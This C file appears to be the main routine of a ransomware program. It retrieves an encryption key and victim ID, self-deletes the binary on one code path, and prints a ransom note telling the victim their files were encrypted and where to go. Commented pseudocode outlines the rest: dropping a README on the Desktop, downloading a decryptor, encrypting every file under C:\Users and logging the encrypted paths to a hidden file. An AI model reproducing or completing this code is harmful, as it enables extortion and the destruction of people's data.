#include <stdio.h>
#include "keygen.h"
#include "delete.h"
#include "config.h"
#include "utils.h"
#include "encrypt.h"

#ifdef _WIN32
#include <windows.h>
#endif

int main(int argc, char *argv[]) {
    /*
    #ifndef _WIN32
        self_delete(argv[0]);
    #endif
    */
    char key[512];
    int id;
    if (get_key(&id, key) == 0) {
        self_delete(argv[0]);
    }
    char readme[1024];
    snprintf(readme, sizeof(readme), "All you're files were encrypted, go to %s\nYou're ID is: %d\n", URL, id);
    printf(readme, sizeof(readme));
    /*
    write readme on C:\Users\%s\Desktop\README.txt
    // Download the file from ('$s/Decrypt.exe',URL) to Desktop
    foreach file in 'C:\Users':
        if (encrypt(filepath, key) == 1):
            append filepath on "C:\Users\Public\Documents\.paths.txt"
        else:
            pass
    */
    
    //self_delete(argv[0]);
    return 0;
}
